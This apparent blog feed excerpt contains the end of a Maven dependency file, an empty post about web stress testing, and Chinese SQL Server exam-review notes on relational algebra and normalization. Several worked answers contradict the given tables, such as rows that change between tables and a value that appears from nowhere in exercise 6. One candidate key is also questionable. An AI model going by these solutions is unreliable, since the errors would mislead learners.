        &amp;lt;aliyun-java-vod-upload.version&amp;gt;1.4.11&amp;lt;/aliyun-java-vod-upload.version&amp;gt;

        &amp;lt;aliyun-sdk-vod-upload.version&amp;gt;1.4.11&amp;lt;/aliyun-sdk-vod-upload.version&amp;gt;

        &amp;lt;fastjson.version&amp;gt;1.2.28&amp;lt;/fastjson.version&amp;gt;

        &amp;lt;gson.version&amp;gt;2.8.2&amp;lt;/gson.version&amp;gt;

        &amp;lt;json.version&amp;gt;20170516&amp;lt;/json.version&amp;gt;

        &amp;lt;commons-dbutils.version&amp;gt;1.7&amp;lt;/commons-dbutils.version&amp;gt;

        &amp;lt;canal.client.version&amp;gt;1.1.0&amp;lt;/canal.client.version&amp;gt;

        &amp;lt;docker.image.prefix&amp;gt;zx&amp;lt;/docker.image.prefix&amp;gt;

        &amp;lt;cloud-alibaba.version&amp;gt;0.2.2.RELEASE&amp;lt;/cloud-alibaba.version&amp;gt;

    &amp;lt;/properties&amp;gt;
    &amp;lt;dependencyManagement&amp;gt;
        &amp;lt;dependencies&amp;gt;
            &amp;lt;!--Spring Cloud--&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;org.springframework.cloud&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;spring-cloud-dependencies&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;Hoxton.RELEASE&amp;lt;/version&amp;gt;
                &amp;lt;type&amp;gt;pom&amp;lt;/type&amp;gt;
                &amp;lt;scope&amp;gt;import&amp;lt;/scope&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;org.springframework.cloud&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;spring-cloud-alibaba-dependencies&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${cloud-alibaba.version}&amp;lt;/version&amp;gt;
                &amp;lt;type&amp;gt;pom&amp;lt;/type&amp;gt;
                &amp;lt;scope&amp;gt;import&amp;lt;/scope&amp;gt;
            &amp;lt;/dependency&amp;gt;

            &amp;lt;!--mybatis-plus 持久层--&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;com.baomidou&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;mybatis-plus-boot-starter&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${mybatis-plus.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;!-- velocity 模板引擎, Mybatis Plus 代码生成器需要 --&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;org.apache.velocity&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;velocity-engine-core&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${velocity.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;!--swagger--&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;io.springfox&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;springfox-swagger2&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${swagger.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;!--swagger ui--&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;io.springfox&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;springfox-swagger-ui&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${swagger.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;!--aliyunOSS--&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;com.aliyun.oss&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;aliyun-sdk-oss&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${aliyun.oss.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;!--日期时间工具--&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;joda-time&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;joda-time&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${jodatime.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;!--xls--&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;org.apache.poi&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;poi&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${poi.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;!--xlsx--&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;org.apache.poi&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;poi-ooxml&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${poi.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;!--文件上传--&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;commons-fileupload&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;commons-fileupload&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${commons-fileupload.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;!--commons-io--&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;commons-io&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;commons-io&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${commons-io.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;!--httpclient--&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;org.apache.httpcomponents&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;httpclient&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${httpclient.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;com.google.code.gson&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;gson&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${gson.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;!-- JWT --&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;io.jsonwebtoken&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;jjwt&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${jwt.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;!--aliyun--&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;com.aliyun&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;aliyun-java-sdk-core&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${aliyun-java-sdk-core.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;com.aliyun.oss&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;aliyun-sdk-oss&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${aliyun-sdk-oss.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;com.aliyun&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;aliyun-java-sdk-vod&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${aliyun-java-sdk-vod.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;com.aliyun&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;aliyun-java-vod-upload&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${aliyun-java-vod-upload.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;com.aliyun&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;aliyun-sdk-vod-upload&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${aliyun-sdk-vod-upload.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;dependency&amp;gt;

                &amp;lt;groupId&amp;gt;com.alibaba&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;fastjson&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${fastjson.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;org.json&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;json&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${json.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;commons-dbutils&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;commons-dbutils&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${commons-dbutils.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
            &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;com.alibaba.otter&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;canal.client&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;${canal.client.version}&amp;lt;/version&amp;gt;
            &amp;lt;/dependency&amp;gt;
        &amp;lt;/dependencies&amp;gt;

    &amp;lt;/dependencyManagement&amp;gt;
    &amp;lt;build&amp;gt;
        &amp;lt;plugins&amp;gt;
            &amp;lt;plugin&amp;gt;
                &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;spring-boot-maven-plugin&amp;lt;/artifactId&amp;gt;
            &amp;lt;/plugin&amp;gt;
        &amp;lt;/plugins&amp;gt;
    &amp;lt;/build&amp;gt;
&amp;lt;/project&amp;gt;
&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="JAVA" /><summary type="html">[toc]</summary></entry><entry><title type="html">web压力测试程序开发</title><link href="http://localhost:4000/_posts/2020-06-25-web%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91/" rel="alternate" type="text/html" title="web压力测试程序开发" /><published>2020-06-25T00:00:00+08:00</published><updated>2020-06-25T00:00:00+08:00</updated><id>http://localhost:4000/_posts/web%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-25-web%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91/">&lt;p&gt;[toc]&lt;/p&gt;</content><author><name></name></author><category term="JAVA" /><summary type="html">[toc]</summary></entry><entry><title type="html">sql-server期末复习</title><link href="http://localhost:4000/_posts/2020-06-24-sql-server%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/" rel="alternate" type="text/html" title="sql-server期末复习" /><published>2020-06-24T00:00:00+08:00</published><updated>2020-06-24T00:00:00+08:00</updated><id>http://localhost:4000/_posts/sql-server%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-24-sql-server%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;用于期末复习,切勿用于作弊!违者后果自负!!!!!!!&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;数据处理三个阶段&quot;&gt;数据处理三个阶段&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;概念模型&lt;/li&gt;
  &lt;li&gt;逻辑模型&lt;/li&gt;
  &lt;li&gt;物理模型&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;常见数据模型&quot;&gt;常见数据模型&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;层次模型&lt;/li&gt;
  &lt;li&gt;网状模型&lt;/li&gt;
  &lt;li&gt;关系模型&lt;/li&gt;
  &lt;li&gt;面向对象模型&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;rs例题&quot;&gt;R&amp;amp;S例题&lt;/h1&gt;

&lt;p&gt;R&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;A&lt;/th&gt;
      &lt;th&gt;B&lt;/th&gt;
      &lt;th&gt;C&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;S&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;A&lt;/th&gt;
      &lt;th&gt;B&lt;/th&gt;
      &lt;th&gt;C&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;计算:&lt;/p&gt;

&lt;hr /&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
1.R\bigcup S\\
2.R-S\\
3.RXS\\
4. \prod_{2,3}(S)\\
5.\sigma_{B&lt;'5'}(R)\\
6. R\infty_{2&lt;2}S\\
7. R\infty S %]]&gt;&lt;/script&gt;

&lt;hr /&gt;

&lt;p&gt;解:&lt;/p&gt;

&lt;p&gt;1.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;A&lt;/th&gt;
      &lt;th&gt;B&lt;/th&gt;
      &lt;th&gt;C&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;2.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;A&lt;/th&gt;
      &lt;th&gt;B&lt;/th&gt;
      &lt;th&gt;C&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;3.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;R.A&lt;/th&gt;
      &lt;th&gt;R.B&lt;/th&gt;
      &lt;th&gt;R.C&lt;/th&gt;
      &lt;th&gt;S.A&lt;/th&gt;
      &lt;th&gt;S.B&lt;/th&gt;
      &lt;th&gt;S.C&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;4.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;C&lt;/th&gt;
      &lt;th&gt;B&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;5.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;A&lt;/th&gt;
      &lt;th&gt;B&lt;/th&gt;
      &lt;th&gt;C&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;6.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;RA&lt;/th&gt;
      &lt;th&gt;RB&lt;/th&gt;
      &lt;th&gt;RC&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;SA&lt;/th&gt;
      &lt;th&gt;SB&lt;/th&gt;
      &lt;th&gt;SC&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;5&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;7.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;A&lt;/th&gt;
      &lt;th&gt;B&lt;/th&gt;
      &lt;th&gt;C&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;3&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;教学管理例题&quot;&gt;教学管理例题&lt;/h1&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;S(SNO,SNAME,AGE,SEX,COLLEGE)\\
SC(SNO,CNO,GRADE)\\
C(CNO,CNAME,CDEPT,TNAME)\\&lt;/script&gt;

&lt;ul&gt;
  &lt;li&gt;检索LIU老师教的课程号,课程名&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\pi_{CNO,CNAME}(\sigma_{TNAME='LIU'}(C))&lt;/script&gt;

&lt;ul&gt;
  &lt;li&gt;检索年龄大于23的男生的学号和姓名&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\pi_{SNO,SNAME}(\sigma_{SEX='M' and AGE &gt;23}(S))&lt;/script&gt;

&lt;ul&gt;
  &lt;li&gt;检索学号为S3学生所学课程的课程名与任课老师&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\pi_{CNAME,TNAME}(\sigma_{SNO='S3'}(SC\infty C))&lt;/script&gt;

&lt;ul&gt;
  &lt;li&gt;检索至少选修LIU老师教的课程中一门课的女生姓名&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\pi_{SNAME}(\sigma_{TNAME='LIU' and SEX='女'}(S\infty SC \infty C))&lt;/script&gt;

&lt;ul&gt;
  &lt;li&gt;检索WANG同学不学的课程的课程号&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\pi_{CNO}(C) - \pi_{CNO}(\sigma_{SNAME='wang'}(S\infty SC))&lt;/script&gt;

&lt;ul&gt;
  &lt;li&gt;检索至少选修两门课程的学生号&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\pi_{SNO}(SC\infty SC)- \pi_{SNO}(\sigma_{1=4  and  2 = 5}(SC \infty SC))&lt;/script&gt;

&lt;h1 id=&quot;部门例题&quot;&gt;部门例题&lt;/h1&gt;

&lt;p&gt;关系模式R(职工编号,日期,日营业额,部门名,部门经理),规定没个职工每天只有一个营业额,每个职工只能在一个部门,每个部门只有一个经理,回答:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;写出模式R的基本FD和候选键&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;FD:\\
(职工编号,日期)-&gt;日营业额\\
职工编号-&gt;部门名\\
部门名-&gt;部门经理\\
候选键:(职工编号,日期)&lt;/script&gt;

&lt;ul&gt;
  &lt;li&gt;说明R不是2NF理由,并吧R分解为2NF模式集&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;由候选键知:\\
(职工编号,日期)-&gt;日营业额\\
(职工编号,日期)-&gt;部门名\\
(职工编号,日期)-&gt;部门经理\\&lt;/script&gt;

&lt;p&gt;因为在(职工编号,日期)-&amp;gt;部门名,(职工编号,日期)-&amp;gt;部门经理 中,日期是多余属性,存在部分函数依赖,所以R不是2NF&lt;/p&gt;

&lt;p&gt;R进行分解:
&lt;script type=&quot;math/tex&quot;&gt;R1(职工编号, 日期,日营业额)\\
R2(职工编号,部门名,部门经理)\\&lt;/script&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;进而分级3NF&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;R1不存在传递依赖,所以为3NF&lt;/p&gt;

&lt;p&gt;R2中有&lt;/p&gt;

&lt;p&gt;职工编号-&amp;gt;部门名,职工编号-&amp;gt;部门经理,&lt;/p&gt;

&lt;p&gt;又部门名-&amp;gt;部门经理&lt;/p&gt;

&lt;p&gt;则存在传递依赖,R2不是3NF&lt;/p&gt;

&lt;p&gt;分解为R21(职工编号,部门名)&lt;/p&gt;

&lt;p&gt;R22(部门名,部门经理)&lt;/p&gt;

&lt;h1 id=&quot;运动例题&quot;&gt;运动例题&lt;/h1&gt;

&lt;p&gt;有关系模式R(运动员编号,比赛项目,成绩,比赛类别,比赛主管),规定:每个运动员参加一个比赛项目,只有一个成绩,每个比赛项目只属于一个比赛类别,每个比赛类别只有一个比赛主管,回答:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;写出基本FD和候选键&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;FD:\\
(运动员编号,比赛项目)-&gt;成绩\\

比赛项目-&gt;比赛类别\\
比赛类别-&gt;比赛主管\\
候选键:(运动员编号,比赛项目),比赛项目&lt;/script&gt;

&lt;ul&gt;
  &lt;li&gt;R不是2NF理由,并把R分解为2NF&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;R有两个这样的FD：&lt;/p&gt;

&lt;p&gt;​    （运动员编号，比赛项目）→ （比赛类别，比赛主管）&lt;/p&gt;

&lt;p&gt;​           比赛项目 → （比赛类别，比赛主管）&lt;/p&gt;

&lt;p&gt;可见，前一个FD是部分（局部）函数依赖，所以R不是2NF模式。&lt;/p&gt;

&lt;p&gt;分解:&lt;/p&gt;

&lt;p&gt;R1(比赛项目，比赛类别，比赛主管)&lt;/p&gt;

&lt;p&gt;R2(运动员编号，比赛项目，成绩)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;分解为3NF&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;R2已是3NF模式。&lt;/p&gt;

&lt;p&gt;在R1中，存在两个FD：比赛项目 → 比赛类别&lt;/p&gt;

&lt;p&gt;​           比赛类别 → 比赛主管&lt;/p&gt;

&lt;p&gt;因此，“比赛项目 → 比赛主管”是一个传递依赖，R1不是3NF模式。&lt;/p&gt;

&lt;p&gt;R1应分解为R11（比赛项目，比赛类别）&lt;/p&gt;

&lt;p&gt;​      R12（比赛类别，比赛主管）&lt;/p&gt;

